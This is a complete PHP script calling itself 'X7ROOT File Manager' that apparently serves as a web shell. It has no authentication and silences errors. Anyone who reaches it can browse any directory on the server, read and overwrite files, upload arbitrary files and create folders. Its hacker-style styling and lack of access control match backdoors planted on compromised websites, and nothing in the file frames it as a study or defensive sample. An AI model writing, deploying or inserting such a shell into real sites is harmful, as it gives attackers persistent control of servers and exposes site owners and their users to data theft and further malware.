<?php
@ini_set('display_errors', 0);
@set_time_limit(0);
error_reporting(0);

function safe($s) {
    return htmlspecialchars($s, ENT_QUOTES | ENT_HTML5, 'UTF-8');
}

function formatSize($bytes) {
    $units = ['B','KB','MB','GB','TB'];
    for ($i = 0; $bytes >= 1024 && $i < count($units)-1; $i++) {
        $bytes /= 1024;
    }
    return round($bytes, 2).' '.$units[$i];
}

$cwd = isset($_GET['path']) ? $_GET['path'] : getcwd();
$cwd = realpath($cwd);

// Handle upload
if (isset($_POST['upload']) && isset($_FILES['file'])) {
    $target = $cwd . '/' . basename($_FILES['file']['name']);
    if (@move_uploaded_file($_FILES['file']['tmp_name'], $target)) {
        echo "<div style='color:#0f0'>[+] File uploaded successfully.</div>";
    } else {
        echo "<div style='color:#f00'>[-] Upload failed.</div>";
    }
}

// Handle file edit save
if (isset($_POST['save']) && isset($_POST['filename'])) {
    $path = $cwd.'/'.basename($_POST['filename']);
    if (@file_put_contents($path, $_POST['content']) !== false) {
        echo "<div style='color:#0f0'>[+] File saved successfully.</div>";
    } else {
        echo "<div style='color:#f00'>[-] Failed to save file.</div>";
    }
}

// Handle create directory
if (isset($_POST['mkdir']) && isset($_POST['dirname'])) {
    $dirName = basename($_POST['dirname']);
    $fullPath = $cwd . '/' . $dirName;
    if (!file_exists($fullPath)) {
        if (@mkdir($fullPath)) {
            echo "<div style='color:#0f0'>[+] Directory created.</div>";
        } else {
            echo "<div style='color:#f00'>[-] Failed to create directory.</div>";
        }
    } else {
        echo "<div style='color:#f90'>[!] Directory already exists.</div>";
    }
}

echo "<!DOCTYPE html><html lang='en'><head><meta charset='UTF-8'><title>File Manager</title><style>
body { background:#0d0d0d; color:#ccc; font-family:monospace; padding:20px; }
a { color:#5af; text-decoration:none; }
a:hover { text-decoration:underline; }
input, textarea, select { background:#111; color:#0f0; border:1px solid #444; padding:5px; width:100%; }
input[type=submit] { background:#222; color:#0f0; border:1px solid #0f0; cursor:pointer; }
hr { border:none; border-top:1px solid #333; margin:20px 0; }
.dir { color:#0ff; }
.file { color:#fff; }
.size { color:#999; float:right; }
h2 { margin:0 0 10px 0; }
</style></head><body>";

echo "<h2>X7ROOT File Manager</h2>";
echo "<b>Current Path:</b> ".safe($cwd)."<hr>";

// Show navigation
$parts = explode(DIRECTORY_SEPARATOR, $cwd);
$nav = "";
$build = "";
foreach ($parts as $p) {
    if ($p == "") continue;
    $build .= "/$p";
    $nav .= "<a href='?path=".urlencode($build)."'>".safe($p)."</a> / ";
}
echo $nav."<hr>";

// File listing
$files = @scandir($cwd);
echo "<ul style='list-style:none;padding:0;'>";
foreach ($files as $f) {
    if ($f == ".") continue;
    $fp = $cwd.'/'.$f;
    if (is_dir($fp)) {
        echo "<li class='dir'>📁 <a href='?path=".urlencode($fp)."'>".safe($f)."</a></li>";
    } else {
        echo "<li class='file'>📄 <a href='?path=".urlencode($cwd)."&edit=".urlencode($f)."'>".safe($f)."</a><span class='size'>(".formatSize(filesize($fp)).")</span></li>";
    }
}
echo "</ul><hr>";

// Edit file
if (isset($_GET['edit'])) {
    $file = basename($_GET['edit']);
    $full = $cwd.'/'.$file;
    if (file_exists($full)) {
        $content = @file_get_contents($full);
        echo "<h3>Editing: ".safe($file)."</h3>";
        echo "<form method='post'>";
        echo "<input type='hidden' name='filename' value='".safe($file)."'>";
        echo "<textarea name='content' rows='15'>".safe($content)."</textarea><br>";
        echo "<input type='submit' name='save' value='Save File'>";
        echo "</form><hr>";
    }
}

// Upload
echo "<h3>Upload File</h3>";
echo "<form method='post' enctype='multipart/form-data'>";
echo "<input type='file' name='file'><br>";
echo "<input type='submit' name='upload' value='Upload'>";
echo "</form><hr>";

// Create folder
echo "<h3>Create Folder</h3>";
echo "<form method='post'>";
echo "<input type='text' name='dirname' placeholder='New folder name'>";
echo "<input type='submit' name='mkdir' value='Create'>";
echo "</form>";

echo "</body></html>";
